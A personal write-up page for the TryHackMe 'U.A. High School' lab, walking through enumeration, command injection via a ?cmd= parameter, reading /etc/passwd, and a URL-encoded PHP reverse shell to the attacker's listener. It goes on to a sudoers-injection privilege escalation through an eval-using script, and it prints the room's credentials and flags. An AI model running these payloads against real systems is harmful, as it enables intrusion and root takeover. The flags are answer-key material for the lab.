@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>U.A. High School Walkthrough Room</title>
+  <link rel="stylesheet" href="../../room-css/U.A High School.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="icon" href="../../images/AU/explosion.ico" type="image/x-icon"/>
+</head>
+<body>
+
+<header>
+  <h2>U.A. High School Walkthrough Room</h2>
+  <nav>
+    <a href="../../index.html" style="color: #facc15; text-decoration: none; font-weight: bold;">Home</a> |
+    <a href="../index.html" style="color: #facc15; text-decoration: none; font-weight: bold;">Write-Ups</a> |
+    <a href="../../Tools/list.html" style="color: #facc15; text-decoration: none; font-weight: bold;">Tools</a>
+  </nav>
+</header>
+
+<main>
+  <!-- Banner -->
+  <section style="background: radial-gradient(circle at center, #1e3a8a 0%, #0f172a 100%); padding: 2rem; border-radius: 8px;">
+    <img src="../../images/UA/banner5.png" 
+         alt="UA banner" 
+         style="display: block; margin: 0 auto; height: 300px; width: 1600px; border: 1px solid #ccc; padding: 5px;">
+  </section>
+
+  <!-- Walkthrough Navigation Menu -->
+  <nav id="task-menu">
+    <ul>
+      <li><a href="#task1">🛡️ Enumeration</a></li>
+      <li><a href="#task2">🧩 Initial Access</a></li>
+      <li><a href="#task3">🔐 Privilege Escalation</a></li>
+      <li><a href="#quirk-analyzer">🦸‍♂️ Discover Your U.A Quirk</a></li>
+    </ul>
+  </nav>
+
+  <!-- Room Summary Section -->
+  <section id="room-summary">
+    <h2>🕹️ U.A. High School — Walkthrough</h2>
+    <p>🧩 <strong>Difficulty:</strong> Easy/Medium</p> 
+    <p>🖥️ <strong>Platform:</strong> Linux</p>
+    <p>🎯 <strong>Focus Areas:</strong> Web exploitation, enumeration, privilege escalation</p>
+
+    <h2>Summary</h2>
+    <article>
+    <p>
+      🛡️ The U.A. High School room on TryHackMe is a themed cybersecurity walkthrough inspired by the anime *My Hero Academia*. Designed to challenge and educate aspiring ethical hackers, <br>
+      the room immerses players in a fictional training environment where they take on the role of a U.A. student uncovering digital threats.
+    </p>
+    <p>
+      Through a series of hands-on tasks—including network scanning, vulnerability exploitation, and flag discovery—users navigate a stylized web application infused with heroic branding and anime visuals.<br>
+       Each challenge mirrors the spirit of U.A.’s hero training, blending technical skill-building with thematic storytelling.
+    </p>
+    <p>
+      Whether you're a fan of the series or a red teamer in training, this room offers a unique fusion of cybersecurity fundamentals and pop culture immersion, making it both engaging and educational.
+    </p>
+    </article>
+  </section>
+
+<!-- Section 1 -->
+<section id="task1">
+
+  <h2>Task 1 - Enumeration</h2>
+
+  <img src="../../images/UA/NmapScan.png" 
+       alt="Nmap Scan" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>Based on our scan results, we can see that two ports are open:</p>
+  <ul>
+    <li>SSH (22)</li>
+    <li>HTTP (80)</li>
+  </ul>
+
+  <p>After visiting the website—either by accessing the IP directly or using a hostname mapped in our <strong>/etc/hosts</strong> file—we arrive at the following page:</p>
+
+  <img src="../../images/UA/WebPage.png" 
+       alt="Web Page Screenshot" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>Clicking through all the links didn’t yield anything useful. However, after inspecting the page source, we discovered that the site is static.</p>
+
+  <p>Next, we need to check for any hidden directories. For that, we’ll use <strong>Gobuster</strong>:</p>
+  <p><strong>gobuster dir -u http://[TARGET IP] -w /usr/share/wordlists/dirb/common.txt</strong></p>
+
+  <img src="../../images/UA/gobuster.png" 
+       alt="Gobuster Scan" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <ul>
+    <li><strong>dir</strong>: Performs directory and file brute-forcing on a web server.</li>
+    <li><strong>-u</strong>: Specifies the target web address.</li>
+    <li><strong>-w</strong>: Points to the wordlist we want to use—there are many available.</li>
+  </ul>
+
+  <p>We discovered an <strong>/assets</strong> folder. Although it didn’t return anything useful, we can enumerate it further:</p>
+  <p><strong>gobuster dir -u http://[TARGET IP]/assets -w /usr/share/wordlists/dirb/common.txt</strong></p>
+
+  <img src="../../images/UA/assetsimages.png" 
+       alt="Gobuster Result reveal an interesting directory" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>We found two additional paths: <strong>/assets/images</strong> and <strong>/assets/index.php</strong>. We checked both, and while <strong>/assets/images</strong> didn’t reveal anything, <strong>/assets/index.php</strong> looked dynamic due to its <strong>.php</strong> extension.</p>
+
+  <p>We tested for command injection by appending <strong>?cmd=ls</strong> to the URL:</p>
+
+  <img src="../../images/UA/commandinjection.png" 
+       alt="Command Injection" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>And voilà—we received a string:</p>
+  <ul>
+    <li><strong>aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==</strong></li>
+  </ul>
+  <p>This is a <strong>Base64-encoded</strong> string. We can decode it using:</p>
+  <p><strong>echo "aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==" | base64 -d</strong></p>
+
+  <img src="../../images/UA/decodestring.png" 
+       alt="Base64 Decode" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>Now that we’ve confirmed command injection works, we can try retrieving <strong>/etc/passwd</strong>:</p>
+  <p><strong>?cmd=cat /etc/passwd</strong></p>
+
+  <img src="../../images/UA/etcpassword.png" 
+       alt="etc passwd" 
+       style="border:1px solid #ccc; padding:5px;">
+
+
+  <p>After decoding the output, we found a valid username:</p>
+
+  <img src="../../images/UA/username.png" 
+       alt="Potential Username" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>We now have a username to attempt initial access. To do that, we’ll craft a <strong>reverse shell</strong> payload and encode it for browser compatibility.</p>
+  <p>Visit 
+    <a href="https://revshells.com" target="_blank" rel="noopener noreferrer"
+       style="display: inline-block; background-color: #1e3a8a; color: #facc15; font-weight: bold; text-decoration: none; padding: 0.6rem 1.2rem; border-radius: 6px; border: 2px solid #facc15; transition: all 0.3s ease; font-size: 1.1rem;"
+       onmouseover="this.style.backgroundColor='#facc15'; this.style.color='#1e3a8a';"
+       onmouseout="this.style.backgroundColor='#1e3a8a'; this.style.color='#facc15';">
+       📂 revshells.com
+    </a>
+    to generate and encode your reverse shell payload in URL format. Once encoded, it will look something like this:<br>
+    <strong>php%20-r%20%27%24sock%3Dfsockopen%28%22[IP ADDRESS]%22%2C[PORT]%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</strong>
+  </p>
+  <p>Make sure to replace <strong>[IP ADDRESS]</strong> and <strong>[PORT]</strong> with your actual listener details.</p>
+
+  <img src="../../images/UA/reversevideo.gif" 
+       alt="Reverse shell URL encoding animation" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>Now we’re ready to use our reverse shell. Since we’ve confirmed command injection works, we can append the encoded payload to the URL using <strong>?cmd=</strong>.</p>
+  <p>Before doing that, we need to set up a <strong>Netcat listener</strong> on our local machine to catch the incoming connection:</p>
+  <p><strong>nc -lnvp [PORT]</strong></p>
+  <ul>
+    <li><strong>-l</strong>: Listen for incoming connections</li>
+    <li><strong>-n</strong>: Avoid DNS lookup (use numeric IPs)</li>
+    <li><strong>-v</strong>: Verbose output</li>
+    <li><strong>-p</strong>: Specify the port</li>
+  </ul>
+  <p>Once the listener is running, paste the encoded reverse shell after <strong>?cmd=</strong> in the URL. If successful, your terminal should receive a shell from the target machine.</p>
+
+  <img src="../../images/UA/deku.png" 
+       alt="Deku Username" 
+       style="border:1px solid #ccc; padding:5px;">
+
+  <p>Sometimes the shell isn’t immediately visible. Press <strong>Enter</strong> or run a command like <strong>ls</strong> or <strong>whoami</strong> to confirm the connection.<br>
+  Now that we're connected to the remote machine, we can proceed with initial access using the username <strong>Deku</strong> that we discovered earlier.</p>
+  <p>We can use the following commands to get a stable shell after getting into the system:</p>
+  <ul>
+    <li><strong>python -c 'import pty;pty.spawn("/bin/bash")'</strong>: Spawns a pseudo-terminal for better shell interaction.</li>
+    <li><strong>export TERM=xterm</strong>: Sets the terminal type to xterm to support full terminal features.</li>
+    <li><strong>Ctrl + Z</strong>: Suspends the current shell and returns to the local terminal.</li>
+    <li><strong>stty raw -echo; fg</strong>: Restores the shell and enables raw input mode for smoother command execution.</li>
+  </ul>
+
+</section>
+
+
+  <!-- Section 2 -->
+ <section id="task2">
+  <article>
+    <h2>Task 2 - Initial Access</h2>
+    <p>Now that we've gained initial access to the system, it's time to explore what we can use to escalate our privileges.</p>
+
+    <img src="../../images/UA/assets.png" 
+         alt="asset directory content" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>
+       The first thing we usually do after landing on a machine is check what kind of access we have and what files or directories we can interact with.<br>
+       In this case, our permissions were limited, so we couldn’t do much initially.
+    </p>
+
+    <p>After some digging, I found something interesting inside the <strong>/assets/images</strong> directory. There were two image files, but since they weren’t on our local machine, we needed to transfer them from the remote system to investigate further.</p>
+
+    <p>To do that, we’ll set up a <strong>Netcat listener</strong>—similar to before, but with a slight twist:</p>
+
+    <img src="../../images/UA/oneforallpic.png" 
+         alt="oneforall jpg transfer" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>Use the following command to set up a listener on your local machine to receive the image file:</p>
+
+    <img src="../../images/UA/oneforallnc.png" 
+         alt="receiving the oneforall picture" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>Then, use this command on the remote machine to transfer the image:</p>
+
+    <p>
+      Once the file is on your local machine, you can inspect the images to check for hidden data or corruption. Upon examining the <strong>OneForAll</strong> image,<br>
+       we noticed that although it had a <strong>.jpg</strong> extension, its metadata indicated the file was broken. So we needed to fix it.
+      </p>
+
+    <img src="../../images/UA/oneforalltype.png" 
+         alt="File type check" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>This guide shows how to repair the corrupted image using <strong>hexedit</strong> by restoring its <strong>magic number</strong>—the signature bytes that identify the file format.</p>
+
+      <p></p><strong>What is a magic number?</strong></p>
+
+    <ul>
+      <li>A magic number is a unique sequence of bytes at the beginning of a file that identifies its format.</li>
+      <li>For example, JPEG files start with <strong>FF D8 FF</strong>, while PNG files start with <strong>89 50 4E 47</strong>.</li>
+      <li>These help software recognize and handle different file types correctly.</li>
+    </ul>
+
+    <p>To fix the image, open it in hexedit:</p>
+    <p><strong>hexedit oneforall.jpg</strong></p>
+
+    <p>Navigate to the beginning of the file and change the first three bytes to <strong>FF D8 FF</strong>. Save the file.</p>
+
+    <img src="../../images/UA/hexedit1.gif" 
+         alt="Restored image" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>After saving, you can open the image with a viewer or inspect its <strong>metadata</strong>using the <strong>file</strong> command.</p>
+
+    <img src="../../images/UA/original.png" 
+         alt="Restored image" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>Now that the image is restored, we can see a hidden message. To extract it, we’ll use a tool called <strong>steghide</strong>.</p>
+
+    <p>Run the following command:</p>
+    <p><strong>steghide extract -sf oneforall.jpg</strong></p>
+
+    <p>You'll be prompted for a passphrase, but we don’t have one yet—so we need to dig deeper.</p>
+
+    <p>After further exploration, we found a hidden directory: <strong>/var/www/Hidden_Content</strong>. Inside, there was a file named <strong>passphrase.txt</strong>.</p>
+
+    <p>Using <strong>cat</strong>, we viewed its contents. It revealed a Base64-encoded string:</p>
+    <p><strong>QWxsbWlnaHRGb3JFdmVyISEhCg==</strong></p>
+
+    <p>To decode it, run:</p>
+    <p><strong>echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d</strong></p>
+
+    <p>Decoded passphrase:</p>
+    <ul>
+      <li><strong>AllMightForEver!!!</strong></li>
+    </ul>
+
+    <p>Now we can extract the hidden message using:</p>
+    <p><strong>steghide extract -sf oneforall.jpg -p AllMightForEver!!!</strong></p>
+
+    <p>After entering the passphrase, the hidden message is successfully extracted—revealing our next clue.</p>
+
+    <img src="../../images/UA/extractedinfo.png" 
+         alt="Extracted info" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p>Inside the extracted data, we found a file named <strong>creds.txt</strong>. Opening it revealed our first major breakthrough: a username and password combo:</p>
+    <p><strong>deku:One?For?All_!!one1/A</strong></p>
+
+    <p>Using these credentials, we can now log in as <strong>Deku</strong> via SSH and retrieve our first flag.</p>
+
+    <img src="../../images/UA/flag_1.png" 
+         alt="User flag" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p><strong>User Flag</strong></p>
+    <div 
+         style="width: 300px; padding: 1rem; background-color: #1e3a8a; color: transparent; text-shadow: 0 0 5px rgba(255,255,255,0.5); font-weight: bold; border-radius: 8px; border: 2px solid #facc15; transition: all 0.3s ease;"
+         onmouseover="this.style.color='#facc15'; this.style.textShadow='none';"
+         onmouseout="this.style.color='transparent'; this.style.textShadow='0 0 5px rgba(255,255,255,0.5)';">
+      THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+    </div>
+  </article>
+</section>
+
+<section id="task3">
+  <article>
+    <h2>Task 3 - Privilege Escalation</h2>
+    <p>
+      Now that we’ve gained <strong>initial access with user-level privileges</strong>, we can move into the next phase and attempt to gain <br>
+      <strong>root access or administrative control</strong> over the system.
+    </p>
+    <p>First, we need to check what level of access we currently have by running the command <strong>sudo -l</strong>. Here’s what we get:</p>
+
+    <img src="../../images/UA/dukuaccess.png" 
+        alt="deku access" 
+        style="border:1px solid #ccc; padding:5px;">
+    <p>
+      While exploring the system, we discovered a sudo rule that allows a user to execute a specific script with elevated privileges:<br>
+      <strong>(ALL) /opt/NewComponent/feedback.sh</strong>
+    </p>
+    <p>
+      This means the user can run the <strong>feedback.sh</strong> script located in <strong>/opt/NewComponent/</strong> as <em>any user</em>, <br>
+      including root, using <strong>sudo</strong>. In other words, the system grants permission to execute this script with administrative rights.
+    </p>
+    <p>Let’s view the content of the script to understand what it does:</p>
+
+    <img src="../../images/UA/scriptcontent.png" 
+         alt="feedback.sh conent" 
+         style="border:1px solid #ccc; padding:5px;">
+    <p>
+      The <strong>feedback.sh</strong> script is a basic Bash program designed to collect user feedback and save it to a log file. <br>
+      It displays a welcome message, prompts the user for input, and performs a basic security check to filter out <br>
+      potentially dangerous characters <strong>(like <code>\`</code>, <code>$()</code>, <code>|</code>, <code>&</code>, etc.)</strong>.
+    </p>
+
+    <p>
+      If the input passes the filter, the script uses <strong>eval</strong> to echo the feedback and then <br>
+      appends it to <code>/var/log/feedback.txt</code>. If the input contains restricted characters, it rejects the submission.
+    </p>
+
+    <p>
+      Instead of creating a <strong>new root-level user</strong>, we can take a more direct approach. Since the <strong>feedback.sh</strong> <br>
+      script runs with <strong>sudo</strong> and uses <strong>eval</strong>, we can inject a command that modifies the <strong>/etc/sudoers</strong> <br>
+      file and grants full administrative access to our current user:
+    </p>
+
+    <img src="../../images/UA/modified the script.png" 
+         alt="Giving our user full access" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <pre><code>deku ALL=NOPASSWD: ALL' >> /etc/sudoers</code></pre>
+
+    <p>
+      Once the above line is added as feedback, <strong>Deku</strong> can run any command as root without a password. <br>
+      This marks a clean privilege escalation and gives us persistent control over the system.
+    </p>
+    <p>
+      We can test this by running <strong>sudo -l</strong> again. We should see our username listed with <strong>ALL</strong>, <br>
+      confirming that we now have unrestricted sudo access.
+    </p>
+    <p>
+      To switch to the root user, type <strong>sudo -s</strong>. Once we’re operating as root, we can retrieve the root flag from the root directory.
+    </p>
+
+    <img src="../../images/UA/root.png" 
+         alt="root flag" 
+         style="border:1px solid #ccc; padding:5px;">
+
+    <p><strong>Root Flag</strong></p>
+    <div 
+      style="width: 300px; padding: 1rem; background-color: #1e3a8a; color: transparent; text-shadow: 0 0 5px rgba(255,255,255,0.5); font-weight: bold; border-radius: 8px; border: 2px solid #facc15; transition: all 0.3s ease;"
+      onmouseover="this.style.color='#facc15'; this.style.textShadow='none';"
+      onmouseout="this.style.color='transparent'; this.style.textShadow='0 0 5px rgba(255,255,255,0.5)';">
+      THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+    </div>
+  </article>
+</section>
+
+<!-- 🧬 Quirk Analyzer -->
+<section id="quirk-analyzer" style="margin: 3rem auto; max-width: 600px; padding: 1.5rem; background-color: #0f172a; border-radius: 12px; border: 2px solid #facc15; box-shadow: 0 0 10px rgba(250, 204, 21, 0.3); font-family: 'Roboto', sans-serif;">
+  <h3 style="color: #facc15; font-size: 1.5rem; margin-bottom: 1rem;">🔍 Discover Your U.A. Quirk</h3>
+
+  <label for="hero-name" style="color: #facc15; font-weight: bold;">Hero Name:</label><br>
+  <input id="hero-name" type="text" placeholder="Enter your hero name..." style="width: 100%; padding: 0.6rem; font-size: 1rem; border-radius: 6px; border: 1px solid #ccc; margin-top: 0.5rem;"><br><br>
+
+  <button onclick="generateQuirk()" style="padding: 0.6rem 1.2rem; background-color: #1e3a8a; color: #facc15; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; margin-right: 0.5rem;">
+    Analyze
+  </button>
+
+  <button onclick="resetQuirk()" style="padding: 0.6rem 1.2rem; background-color: #64748b; color: #fff; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; margin-right: 0.5rem;">
+    Reset
+  </button>
+
+  <button onclick="randomHeroName()" style="padding: 0.6rem 1.2rem; background-color: #10b981; color: #fff; font-weight: bold; border: none; border-radius: 6px; cursor: pointer;">
+    Surprise Me
+  </button>
+
+  <p id="quirk-result" style="margin-top: 1.5rem; color: #facc15; font-weight: bold; font-size: 1.2rem; opacity: 0; transition: opacity 0.6s ease;"></p>
+</section>
+
+<!-- Optional Sound Effect -->
+<audio id="quirk-sound" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_8f9c0c8f4e.mp3?filename=success-1-6297.mp3" preload="auto"></audio>
+
+<script>
+  const quirks = [
+    "Explosion", "Zero Gravity", "Engine Legs", "Hardening", "Electric Surge",
+    "Dark Shadow", "Creation", "Copy", "Frog Form", "Voice Amplifier"
+  ];
+
+  const heroNames = [
+    "Deku", "Bakugo", "Uravity", "Ingenium", "Chargebolt",
+    "Creati", "Froppy", "Tokoyami", "Present Mic", "Shinso"
+  ];
+
+  function generateQuirk() {
+    const input = document.querySelector('#hero-name');
+    const name = input.value.trim();
+    const resultEl = document.getElementById('quirk-result');
+    const sound = document.getElementById('quirk-sound');
+
+    if (!name) {
+      resultEl.textContent = "Please enter a name!";
+      resultEl.style.opacity = 1;
+      return;
+    }
+
+    const quirk = quirks[Math.floor(Math.random() * quirks.length)];
+    resultEl.textContent = `${name}'s Quirk: ${quirk}`;
+    resultEl.style.opacity = 1;
+
+    // Play sound effect
+    sound.currentTime = 0;
+    sound.play();
+  }
+
+  function resetQuirk() {
+    document.querySelector('#hero-name').value = '';
+    const resultEl = document.getElementById('quirk-result');
+    resultEl.textContent = '';
+    resultEl.style.opacity = 0;
+  }
+
+  function randomHeroName() {
+    const name = heroNames[Math.floor(Math.random() * heroNames.length)];
+    document.querySelector('#hero-name').value = name;
+  }
+</script>
+
+
+</main>
+
+<footer>
+  © 2025 U.A. High School Cybersecurity Room | Designed by Teddy
+</footer>
+
+</body>
+</html>
+
